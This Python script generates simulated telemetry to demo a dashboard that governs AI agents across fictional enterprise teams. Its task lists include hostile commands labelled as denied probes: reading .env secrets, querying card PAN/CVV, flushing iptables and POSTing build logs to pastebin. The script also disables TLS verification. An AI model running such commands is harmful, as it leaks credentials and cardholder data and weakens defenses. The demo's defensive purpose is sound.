#!/usr/bin/env python3
"""
BAP Remote CIO Demonstration Script
===================================
A turn-key enterprise demonstration generator for the BAP Control Panel & Agent Watch V2:
- Launches 12-15 diverse enterprise squads (60-75 governed AI agents concurrently).
- Emits real-time workload progression (Build -> Test -> Document -> Optimize).
- Streams live telemetry, intent classifications, heartbeats, and audit receipts.
- Simulates realistic Zero-Trust Cedar policy enforcement (95% Allowed, 5% Denied probes).
- Works with any local or remote Control Plane URL (HTTP & HTTPS with self-signed SSL).
- Includes clean interactive shutdown (press Enter or Ctrl+C anytime).

Usage:
  python demo_remote_cio.py --url https://<remote-ip-or-host>:8443
  python demo_remote_cio.py --url http://127.0.0.1:8080 --agents-per-team 4
  python demo_remote_cio.py --url http://127.0.0.1:8080 --infinite
"""

import os
import sys
import time
import json
import ssl
import random
import signal
import hashlib
import argparse
import threading
import urllib.request
import urllib.error
from typing import List, Dict, Any, Optional

# Setup workspace and SDK path
WORKSPACE_ROOT = os.path.abspath(os.path.dirname(__file__))
PYTHON_AGENT_DIR = os.path.join(WORKSPACE_ROOT, "python-agent")
if os.path.isdir(PYTHON_AGENT_DIR) and PYTHON_AGENT_DIR not in sys.path:
    sys.path.insert(0, PYTHON_AGENT_DIR)

# Configure SSL context for remote self-signed certificates
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

# ------------------------------------------------------------------------------
# 12 ENTERPRISE TEAMS (Mapped to Enterprise Capability Atlas Domains)
# ------------------------------------------------------------------------------
ENTERPRISE_SQUADS: List[Dict[str, Any]] = [
    {
        "id": "payments-settlement",
        "name": "Payments & Settlement",
        "domain": "Core Financial Services",
        "app_id": "payments-worker",
        "lead": "Sarah Chen",
        "agents": [
            "ISO 20022 Clearing Engine",
            "Real-Time SEPA Transfer Sentry",
            "Payment Gateway Reconciler",
            "Stripe Webhook Idempotency Worker",
            "High-Volume Settlement Batcher"
        ],
        "tasks": [
            {"intent": "FEATURE_ENHANCEMENT", "task": "Integrate real-time ISO 20022 wire transfer payment validation", "cmd": "mvn test -Dtest=PaymentIso20022Suite"},
            {"intent": "INVESTIGATION", "task": "Investigate ACH gateway timeout on European multi-currency corridor", "cmd": "curl -s https://payment-mesh.internal/health/ach"},
            {"intent": "BUG_FIX", "task": "Resolve floating-point precision rounding in settlement ledger", "cmd": "pytest tests/unit/test_currency_rounding.py"},
            {"intent": "SECURITY_AUDIT", "task": "Probe credential store for unencrypted payment provider API keys", "cmd": "cat .env", "malicious": True, "reason": "DENIED: Attempt to read plaintext secrets outside vault boundary"}
        ]
    },
    {
        "id": "core-banking",
        "name": "Core Banking & Ledger",
        "domain": "Transactional Integrity",
        "app_id": "ledger-service",
        "lead": "Alex Kumar",
        "agents": [
            "Double-Entry Ledger Auditor",
            "Deposit Account State Sync",
            "Wire Transfer Router",
            "Interest Amortization Engine",
            "Audit Trail Notarizer"
        ],
        "tasks": [
            {"intent": "DATABASE_CHANGE", "task": "Apply schema migration for high-throughput immutable balance partitions", "cmd": "python scripts/db_migrate.py --partition balance_2026"},
            {"intent": "FEATURE_ENHANCEMENT", "task": "Implement distributed double-entry journal balance validator", "cmd": "go test ./internal/ledger/journal_test.go"},
            {"intent": "AUTOMATION", "task": "Run end-of-day reconciliation across treasury accounts", "cmd": "python scripts/treasury_reconcile.py --day today"}
        ]
    },
    {
        "id": "fraud-detection",
        "name": "Fraud Detection & Risk",
        "domain": "Risk & Anomaly Defense",
        "app_id": "fraud-scorer",
        "lead": "David Park",
        "agents": [
            "Synthetic Identity Classifier",
            "Card Velocity Analyzer",
            "Sanctions List Screener",
            "Account Takeover Probe",
            "Chargeback Dispute Sentry"
        ],
        "tasks": [
            {"intent": "INVESTIGATION", "task": "Score real-time transaction velocity against anomalous IP cluster", "cmd": "python -m fraud.scorer --sample-rate 0.05"},
            {"intent": "AUTOMATION", "task": "Sync latest OFAC and EU sanctions watchlist manifests", "cmd": "curl -s https://sanctions.treasury.internal/v1/sync"},
            {"intent": "SECURITY_AUDIT", "task": "Attempt unauthorized query of raw unmasked credit card PII", "cmd": "sqlcmd -Q 'SELECT pan, cvv FROM card_vault LIMIT 10'", "malicious": True, "reason": "DENIED: Unauthorized raw PCI-DSS cardholder data query blocked"}
        ]
    },
    {
        "id": "cloud-infra",
        "name": "Cloud Infrastructure & SRE",
        "domain": "Platform Reliability",
        "app_id": "terraform-network",
        "lead": "Elena Rostova",
        "agents": [
            "Multi-Cluster Pod Autoscaler",
            "Terraform Drift Reconciler",
            "Envoy Service Mesh Gatekeeper",
            "VPC Egress Boundary Sentry",
            "Failover Chaos Tester"
        ],
        "tasks": [
            {"intent": "PRODUCTION_OPS", "task": "Inspect Kubernetes worker node memory pressure across us-east-1", "cmd": "kubectl get nodes -o custom-columns=NAME:.metadata.name,MEM:.status.capacity.memory"},
            {"intent": "AUTOMATION", "task": "Reconcile out-of-band Terraform infrastructure drift in staging VPC", "cmd": "terraform plan -detailed-exitcode"},
            {"intent": "SECURITY_AUDIT", "task": "Attempt modification of zero-trust iptables security perimeter", "cmd": "iptables -F INPUT", "malicious": True, "reason": "DENIED: Dangerous host firewall flush prohibited on governed runtime"}
        ]
    },
    {
        "id": "enterprise-sec",
        "name": "Enterprise Security & IAM",
        "domain": "Identity & Cryptography",
        "app_id": "auth-gateway",
        "lead": "Marcus Vance",
        "agents": [
            "IAM Wildcard Minimizer",
            "OAuth2 RFC 8693 Auditor",
            "Secret Lease Auto-Rotator",
            "TPM Hardware Enclave Verifier",
            "Container CVE Boundary Sentry"
        ],
        "tasks": [
            {"intent": "SECURITY_AUDIT", "task": "Audit IAM roles to identify and eliminate wildcard privileges", "cmd": "python scripts/iam_audit.py --role-prefix EnterpriseApp"},
            {"intent": "AUTOMATION", "task": "Rotate ephemeral database credentials for financial workers", "cmd": "vault write auth/approle/rotate-secret role=payment-worker"},
            {"intent": "RESEARCH", "task": "Verify TPM 2.0 PCR-7 secure boot signatures on edge fleet", "cmd": "tpm2_pcrread sha256:7"}
        ]
    },
    {
        "id": "data-platform",
        "name": "Data Platform & Analytics",
        "domain": "Data Governance",
        "app_id": "warehouse-etl",
        "lead": "Priya Patel",
        "agents": [
            "Snowflake Partition Sizer",
            "Kafka Consumer Rebalancer",
            "Parquet Schema Verifier",
            "dbt Lineage Validator",
            "Data Lake Lineage Notary"
        ],
        "tasks": [
            {"intent": "DATA_ANALYTICS", "task": "Run dbt data model transformation for executive revenue reporting", "cmd": "dbt run --models mart_revenue_daily"},
            {"intent": "DATA_ANALYTICS", "task": "Verify schema evolution compatibility on customer event stream", "cmd": "python scripts/avro_compat_check.py --topic customer-events"},
            {"intent": "INVESTIGATION", "task": "Monitor Kafka partition consumer group lag on transaction stream", "cmd": "kafka-consumer-groups.sh --describe --group payments-consumer"}
        ]
    },
    {
        "id": "customer-support",
        "name": "Customer Support & CRM",
        "domain": "Operational Workflows",
        "app_id": "crm-connector",
        "lead": "Jordan Reyes",
        "agents": [
            "Tier 3 Escalation Summarizer",
            "SLA Breach Preventer",
            "Sentiment Analysis Dispatcher",
            "Knowledge Base Auto-Indexer",
            "Customer Retention Correlator"
        ],
        "tasks": [
            {"intent": "AUTOMATION", "task": "Summarize Tier-3 technical escalation tickets and synthesize runbook", "cmd": "python scripts/summarize_escalations.py --sla-urgency high"},
            {"intent": "FEATURE_ENHANCEMENT", "task": "Auto-index resolved incident documentation into semantic vector search", "cmd": "python scripts/reindex_kb.py --since 24h"}
        ]
    },
    {
        "id": "finance-erp",
        "name": "Finance & ERP Accounting",
        "domain": "Business Operations",
        "app_id": "erp-reconciler",
        "lead": "Carol Zhang",
        "agents": [
            "Quarterly Run-Rate Projector",
            "Vendor Invoice Matching Bot",
            "Currency Exchange Hedger",
            "GAAP Amortization Calculator",
            "Tax Compliance Sentry"
        ],
        "tasks": [
            {"intent": "DATA_ANALYTICS", "task": "Calculate multi-currency FX hedge exposure for European Q3 book", "cmd": "python -m finance.fx_hedge --book Q3-EUR"},
            {"intent": "AUTOMATION", "task": "Reconcile vendor invoices against procurement purchase orders", "cmd": "python scripts/invoice_match.py --tolerance 0.01"}
        ]
    },
    {
        "id": "it-ops",
        "name": "IT Operations & Helpdesk",
        "domain": "Workforce Enablement",
        "app_id": "it-helpdesk",
        "lead": "Devante Washington",
        "agents": [
            "Intune Policy Synchronizer",
            "SSO Certificate Renewer",
            "Asset Inventory Notary",
            "Endpoint Security Verifier",
            "Stale Device Revocation Sentry"
        ],
        "tasks": [
            {"intent": "AUTOMATION", "task": "Sync Intune device compliance status with BAP zero-trust registry", "cmd": "python scripts/intune_sync.py --check-compliance"},
            {"intent": "PRODUCTION_OPS", "task": "Verify automated renewal of internal Wildcard SSL certificates", "cmd": "certbot certificates --dry-run"}
        ]
    },
    {
        "id": "qa-testing",
        "name": "Quality Assurance & Chaos",
        "domain": "Software Quality",
        "app_id": "qa-runner",
        "lead": "Mei Lin",
        "agents": [
            "Playwright E2E Orchestrator",
            "Flaky Test Bi-Sector",
            "Mutation Test Evaluator",
            "API Contract Linter",
            "Chaos Network Injector"
        ],
        "tasks": [
            {"intent": "TESTING_QUALITY", "task": "Execute full Playwright end-to-end regression across portal microservices", "cmd": "npx playwright test --workers=4"},
            {"intent": "TESTING_QUALITY", "task": "Verify OpenAPI 3.1 specification adheres strictly to REST contracts", "cmd": "spectral lint api/specs/openapi.yaml"}
        ]
    },
    {
        "id": "devops-cicd",
        "name": "DevOps & Release Pipeline",
        "domain": "Continuous Delivery",
        "app_id": "cicd-runner",
        "lead": "Bob Miller",
        "agents": [
            "Blue-Green Canary Pilot",
            "Docker Image Minifier",
            "ArgoCD GitOps Synchronizer",
            "Helm Deployment Validator",
            "Release Notes Synthesizer"
        ],
        "tasks": [
            {"intent": "FEATURE_ENHANCEMENT", "task": "Deploy canary v4.2.0 build of customer authentication service", "cmd": "kubectl set image deployment/auth-service auth=auth-service:v4.2.0"},
            {"intent": "AUTOMATION", "task": "Synchronize ArgoCD application manifests with authoritative git release", "cmd": "argocd app sync enterprise-core-stack"},
            {"intent": "SECURITY_AUDIT", "task": "Attempt outbound curl to arbitrary unknown external pastebin", "cmd": "curl -X POST https://pastebin.com/api/post -d 'build-logs'", "malicious": True, "reason": "DENIED: Egress to non-whitelisted public paste service blocked"}
        ]
    },
    {
        "id": "ai-mlops",
        "name": "AI & Platform MLOps",
        "domain": "AI Governance",
        "app_id": "llm-firewall",
        "lead": "Victor Vance",
        "agents": [
            "Prompt Injection Sentinel",
            "Embedding Vector Sizer",
            "GPU Cluster VRAM Sentry",
            "Model Hallucination Probe",
            "Adversarial Defense Evaluator"
        ],
        "tasks": [
            {"intent": "RESEARCH", "task": "Evaluate LLM tool-calling inputs against jailbreak heuristic signatures", "cmd": "python -m mlops.jailbreak_eval --model gemini-pro"},
            {"intent": "PRODUCTION_OPS", "task": "Monitor H100 GPU cluster temperature and VRAM utilization across nodes", "cmd": "nvidia-smi --query-gpu=utilization.gpu,memory.used --format=csv"}
        ]
    }
]


# ------------------------------------------------------------------------------
# HTTP UTILITIES
# ------------------------------------------------------------------------------
def http_post_json(url: str, payload: Dict[str, Any], headers: Optional[Dict[str, str]] = None, timeout: float = 6.0) -> tuple[int, Dict[str, Any]]:
    """Posts JSON payload to URL with TLS verification disabled for demo flexibility."""
    req_headers = {"Content-Type": "application/json"}
    if headers:
        req_headers.update(headers)
    body = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=body, headers=req_headers)
    try:
        with urllib.request.urlopen(req, context=SSL_CTX, timeout=timeout) as resp:
            data = {}
            raw = resp.read().decode("utf-8")
            if raw.strip().startswith("{") or raw.strip().startswith("["):
                try:
                    data = json.loads(raw)
                except Exception:
                    pass
            return resp.status, data
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8") if e.fp else ""
        data = {}
        try:
            data = json.loads(raw)
        except Exception:
            data = {"error": raw}
        return e.code, data
    except Exception as e:
        return 0, {"error": str(e)}


def http_get_json(url: str, headers: Optional[Dict[str, str]] = None, timeout: float = 6.0) -> tuple[int, Dict[str, Any]]:
    """Gets JSON payload from URL."""
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, context=SSL_CTX, timeout=timeout) as resp:
            data = {}
            raw = resp.read().decode("utf-8")
            if raw.strip().startswith("{") or raw.strip().startswith("["):
                try:
                    data = json.loads(raw)
                except Exception:
                    pass
            return resp.status, data
    except urllib.error.HTTPError as e:
        return e.code, {}
    except Exception as e:
        return 0, {"error": str(e)}


# ------------------------------------------------------------------------------
# GOVERNED AGENT WORKLOAD SIMULATOR
# ------------------------------------------------------------------------------
class GovernedAgent:
    """
    Simulates a live autonomous agent with SPIFFE/SVID identity,
    active heartbeat stream, task progression, and live decision receipts.
    """
    def __init__(
        self,
        squad_id: str,
        squad_name: str,
        domain_name: str,
        app_id: str,
        lead_name: str,
        agent_role: str,
        agent_idx: int,
        server_url: str,
        tasks: List[Dict[str, Any]],
        stats_collector: Any
    ):
        self.squad_id = squad_id
        self.squad_name = squad_name
        self.domain_name = domain_name
        self.app_id = app_id
        self.lead_name = lead_name
        self.agent_role = agent_role
        self.agent_idx = agent_idx
        self.server_url = server_url.rstrip("/")
        self.tasks = tasks
        self.stats = stats_collector

        self.agent_id = f"ag-{squad_id}-{agent_idx:02d}"
        self.session_id = f"sess-{squad_id}-a{agent_idx}-{int(time.time()*1000)%1000000}"
        self.user_email = f"{lead_name.lower().replace(' ', '.')}@enterprise.internal"
        self.spiffe_id = f"spiffe://bap.internal/app/{app_id}/instance/{self.agent_id}"

        self.is_active = False
        self.current_task = tasks[0] if tasks else {"task": "Workload execution", "intent": "AUTOMATION"}
        self.thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()

    def start(self):
        """Starts the session on the remote control plane."""
        start_payload = {
            "session_id": self.session_id,
            "agent_name": f"{self.agent_role} ({self.squad_name})",
            "app_id": self.app_id,
            "instance_id": self.agent_id,
            "user_id": self.lead_name,
            "user_email": self.user_email,
            "spiffe_id": self.spiffe_id,
            "client_pid": os.getpid(),
            "hostname": f"PROD-NODE-{self.squad_id.upper()[:6]}",
            "user_prompt": self.current_task["task"],
            "intent": {
                "primary": self.current_task.get("intent", "FEATURE_ENHANCEMENT"),
                "confidence": 0.98,
                "classifier_version": "bap-intent-rules-v1",
                "source": "bap-python-sdk"
            }
        }
        status, _ = http_post_json(f"{self.server_url}/api/v1/sessions/start", start_payload)
        self.is_active = (status in [200, 201])

        # Submit initial classified prompt
        prompt_hash = hashlib.sha256(self.current_task["task"].encode("utf-8")).hexdigest()
        prompt_payload = {
            "session_id": self.session_id,
            "user_prompt": self.current_task["task"],
            "producer": "bap-python-sdk",
            "prompt_hash": prompt_hash,
            "prompt_capture_enabled": True,
            "intent": {
                "primary": self.current_task.get("intent", "FEATURE_ENHANCEMENT"),
                "confidence": 0.98,
                "classifier_version": "bap-intent-rules-v1",
                "source": "bap-python-sdk"
            }
        }
        http_post_json(f"{self.server_url}/api/v1/sessions/prompt", prompt_payload)

        # Launch work & heartbeat loop in background
        self.thread = threading.Thread(target=self._work_loop, daemon=True, name=f"ag-{self.agent_id}")
        self.thread.start()

    def _work_loop(self):
        """Continuous heartbeat and workload progress loop."""
        step = 0
        while not self._stop_event.is_set() and self.is_active:
            step += 1
            # 1. Send Heartbeat to keep live presence glowing on Radar & Atlas
            hb_payload = {
                "session_id": self.session_id,
                "app_id": self.app_id,
                "agent_id": self.agent_id
            }
            st, _ = http_post_json(f"{self.server_url}/api/v1/sessions/heartbeat", hb_payload)
            if st == 403:  # Session revoked by CISO
                self.is_active = False
                break

            # 2. Every 2-3 intervals, emit an action decision (ALLOWED or DENIED)
            if step % 2 == 0:
                task_item = random.choice(self.tasks)
                is_deny = task_item.get("malicious", False)
                decision = "deny" if is_deny else "allow"
                exit_code = 403 if is_deny else 0
                cmd = task_item.get("cmd", "python --version")
                reason = task_item.get("reason", f"PERMITTED: Standard operational tool call within {self.squad_name} boundary")

                action_id = f"act-{self.agent_id}-{int(time.time()*1000)%1000000}"
                audit_event = {
                    "event_id": action_id,
                    "session_id": self.session_id,
                    "agent_id": self.agent_id,
                    "user_id": self.lead_name,
                    "user_email": self.user_email,
                    "spiffe_id": self.spiffe_id,
                    "source": self.app_id,
                    "executable": cmd.split()[0] if cmd else "sh",
                    "full_command": cmd,
                    "decision": decision,
                    "reason": reason,
                    "duration_ms": random.randint(3, 45),
                    "exit_code": exit_code,
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    "primary_intent": task_item.get("intent", "FEATURE_ENHANCEMENT"),
                    "intent_classifier": "bap-intent-rules-v1",
                    "user_prompt": task_item["task"]
                }
                http_post_json(f"{self.server_url}/api/v1/audit/ingest", [audit_event])

                if is_deny:
                    self.stats.record_denial()
                else:
                    self.stats.record_allow()

            # 3. Dynamic stage progression: advance task prompts
            if step % 5 == 0:
                next_task = random.choice(self.tasks)
                self.current_task = next_task
                p_hash = hashlib.sha256(next_task["task"].encode("utf-8")).hexdigest()
                p_payload = {
                    "session_id": self.session_id,
                    "user_prompt": next_task["task"],
                    "producer": "bap-python-sdk",
                    "prompt_hash": p_hash,
                    "prompt_capture_enabled": True,
                    "intent": {
                        "primary": next_task.get("intent", "AUTOMATION"),
                        "confidence": 0.95,
                        "classifier_version": "bap-intent-rules-v1",
                        "source": "bap-python-sdk"
                    }
                }
                http_post_json(f"{self.server_url}/api/v1/sessions/prompt", p_payload)

            # Heartbeat stagger (2.5 to 3.5s)
            self._stop_event.wait(random.uniform(2.5, 3.5))

    def stop(self):
        """Cleanly ends session on the control plane."""
        self.is_active = False
        self._stop_event.set()
        end_payload = {
            "session_id": self.session_id,
            "reason": "Executive demonstration phase concluded cleanly"
        }
        http_post_json(f"{self.server_url}/api/v1/sessions/end", end_payload, timeout=2.0)


# ------------------------------------------------------------------------------
# STATISTICS COLLECTOR
# ------------------------------------------------------------------------------
class DemoStats:
    def __init__(self):
        self._lock = threading.Lock()
        self.allowed_count = 0
        self.denied_count = 0

    def record_allow(self):
        with self._lock:
            self.allowed_count += 1

    def record_denial(self):
        with self._lock:
            self.denied_count += 1

    def get_counts(self):
        with self._lock:
            return self.allowed_count, self.denied_count


# ------------------------------------------------------------------------------
# TERMINAL UI & RUNNER
# ------------------------------------------------------------------------------
def print_banner(server_url: str, agent_count: int, squads_count: int, duration_sec: int):
    c_blue = "\033[94m"
    c_teal = "\033[96m"
    c_bold = "\033[1m"
    c_reset = "\033[0m"

    print("\n" + "=" * 94)
    print(f"{c_bold}{c_blue}  BOUNDED AUTHORITY PLANE (BAP) - REMOTE CIO/CISO WORKFORCE DEMONSTRATION{c_reset}")
    print("=" * 94)
    print(f"  {c_bold}Target Remote Control Panel{c_reset} : {c_teal}{server_url}{c_reset}")
    print(f"  {c_bold}Enterprise Scale{c_reset}            : {agent_count} Governed AI Agents across {squads_count} Business Units")
    print(f"  {c_bold}Target Duration{c_reset}             : {'Unlimited (Run until Enter/Ctrl+C)' if duration_sec == 0 else f'{duration_sec} seconds (~{round(duration_sec/60, 1)} minutes)'}")
    print(f"  {c_bold}Identity & Trust Mesh{c_reset}       : Cryptographic SPIFFE/SVID + Cedar Zero-Trust PEP Invariants")
    print("-" * 94)
    print(f"  {c_bold}Open Remote Dashboard Workspaces:{c_reset}")
    print(f"    * {c_teal}Mission Control (CIO){c_reset}  : {server_url}/dashboard/?persona=cio#mission-control")
    print(f"    * {c_teal}Trust Command (CISO){c_reset}    : {server_url}/dashboard/?persona=ciso#trust-command")
    print(f"    * {c_teal}Capability Atlas{c_reset}        : {server_url}/dashboard/#capability-atlas")
    print("=" * 94 + "\n")


def parse_arguments():
    parser = argparse.ArgumentParser(description="BAP Remote Control Panel CIO Workforce Demonstration")
    parser.add_argument("--url", default="", help="Remote BAP Control Plane base URL (e.g. http://192.168.1.10:8080)")
    parser.add_argument("--teams", type=int, default=12, help="Number of enterprise squads to activate (1 to 12, default: 12)")
    parser.add_argument("--agents-per-team", type=int, default=5, help="Number of agents per squad (default: 5, total = teams * agents_per_team)")
    parser.add_argument("--duration", type=int, default=180, help="Demo duration in seconds (default: 180s = 3 minutes, 0 = infinite)")
    parser.add_argument("--infinite", action="store_true", help="Run indefinitely until Enter or Ctrl+C is pressed")
    parser.add_argument("--auto-close", action="store_true", help="Close automatically after duration without waiting for Enter")
    return parser.parse_args()


def resolve_control_plane_url(arg_url: str) -> str:
    """Resolves target control plane URL from arguments, env, or configuration."""
    if arg_url:
        return arg_url.rstrip("/")
    # Check environment variable
    env_url = os.getenv("BAP_CONTROL_PLANE_URL") or os.getenv("BAP_SERVER_URL")
    if env_url:
        return env_url.rstrip("/")
    # Check local bap-config.json
    for path in ["bap-config.json", os.path.join(WORKSPACE_ROOT, "bap-config.json")]:
        if os.path.isfile(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    cfg = json.load(f)
                    if cfg.get("controlplane_url"):
                        return cfg["controlplane_url"].rstrip("/")
            except Exception:
                pass
    return "http://127.0.0.1:8080"


def main():
    args = parse_arguments()
    server_url = resolve_control_plane_url(args.url)
    num_teams = min(len(ENTERPRISE_SQUADS), max(1, args.teams))
    agents_per_team = max(1, args.agents_per_team)
    total_agents = num_teams * agents_per_team
    duration = 0 if args.infinite else args.duration

    print_banner(server_url, total_agents, num_teams, duration)

    # 1. Verify Remote Connectivity
    print("[1/4] Probing Remote Control Panel connectivity...")
    healthy = False
    for test_endpoint in ["/api/v1/health", "/health", "/api/activity/summary"]:
        st, data = http_get_json(f"{server_url}{test_endpoint}", timeout=4.0)
        if st == 200:
            healthy = True
            print(f"      [+] Connection verified: {server_url}{test_endpoint} returned HTTP 200 (ONLINE)")
            break

    if not healthy:
        print(f"      [-] WARNING: Remote server at {server_url} did not respond to health check.")
        print("          Ensure bapcontrolplane is started and network/port forwarding is accessible.")
        print("          Proceeding with connection attempts in background...\n")
    else:
        print("      [+] Remote Control Panel is ready to receive live fleet telemetry.\n")

    # 2. Deploy Agents Across Squads
    print(f"[2/4] Deploying {total_agents} governed agents across {num_teams} enterprise divisions...")
    stats = DemoStats()
    agents: List[GovernedAgent] = []

    squads_to_run = ENTERPRISE_SQUADS[:num_teams]
    for sq_idx, squad in enumerate(squads_to_run):
        sys.stdout.write(f"      * [{sq_idx+1:02d}/{num_teams:02d}] Squad: {squad['name']:<28} ({squad['domain']})\n")
        sys.stdout.flush()
        for a_idx in range(1, agents_per_team + 1):
            role = squad["agents"][(a_idx - 1) % len(squad["agents"])]
            agent = GovernedAgent(
                squad_id=squad["id"],
                squad_name=squad["name"],
                domain_name=squad["domain"],
                app_id=squad["app_id"],
                lead_name=squad["lead"],
                agent_role=role,
                agent_idx=a_idx,
                server_url=server_url,
                tasks=squad["tasks"],
                stats_collector=stats
            )
            agent.start()
            agents.append(agent)
            time.sleep(0.03)  # Smooth rollout stagger

    print(f"\n      [+] SUCCESS: All {len(agents)} agents are LIVE and sending heartbeats to {server_url}!\n")

    # 3. Live Demonstration Monitoring Loop
    stop_event = threading.Event()

    def handle_signal(sig, frame):
        stop_event.set()

    signal.signal(signal.SIGINT, handle_signal)

    # Listen for Enter key to stop demo early
    def listen_for_enter():
        try:
            input()
            stop_event.set()
        except Exception:
            pass

    enter_thread = threading.Thread(target=listen_for_enter, daemon=True)
    enter_thread.start()

    print("[3/4] Live Agent Activity In Progress")
    print("      (Agents are executing tasks, classifying prompts, and generating policy decisions)")
    print("      >>> Press [ENTER] or Ctrl+C anytime to finish and clean up <<<\n")

    start_time = time.time()
    last_print = 0

    try:
        while not stop_event.is_set():
            now = time.time()
            elapsed = int(now - start_time)

            if now - last_print >= 3.0:
                last_print = now
                live_agents = sum(1 for a in agents if a.is_active)
                allows, denies = stats.get_counts()

                # Query live summary from remote control plane if available
                act_summary = ""
                st, data = http_get_json(f"{server_url}/api/activity/summary", timeout=2.0)
                if st == 200 and isinstance(data, dict):
                    bus = data.get("business_units_active", f"{num_teams}/{num_teams}")
                    assisted = data.get("estimated_assisted_hours", round(live_agents * 6.6, 1))
                    act_summary = f" | BUs Active: {bus} | Assisted Time: {assisted}h"

                time_str = f"[{elapsed:03d}s" + (f" / {duration:03d}s]" if duration > 0 else "]")
                print(f"      {time_str} Live: {live_agents}/{total_agents} | Decisions: {allows} ALLOW / {denies} BLOCKED{act_summary}")

            if duration > 0 and elapsed >= duration:
                print(f"\n      [*] Demo duration ({duration}s) reached.")
                break

            time.sleep(0.5)

    except KeyboardInterrupt:
        pass

    # 4. Graceful Teardown
    print("\n[4/4] Concluding demonstration: Gracefully shutting down all agent sessions...")
    for idx, agent in enumerate(agents):
        agent.stop()
        if (idx + 1) % 15 == 0 or idx == len(agents) - 1:
            sys.stdout.write(f"      - Closed {idx+1}/{len(agents)} sessions...\n")
            sys.stdout.flush()

    time.sleep(0.5)
    print("\n" + "=" * 94)
    print("  [+] All agent sessions deregistered cleanly from remote control plane.")
    print("  [+] Demo completed with zero dangling sessions or corrupted state.")
    print("=" * 94 + "\n")


if __name__ == "__main__":
    main()
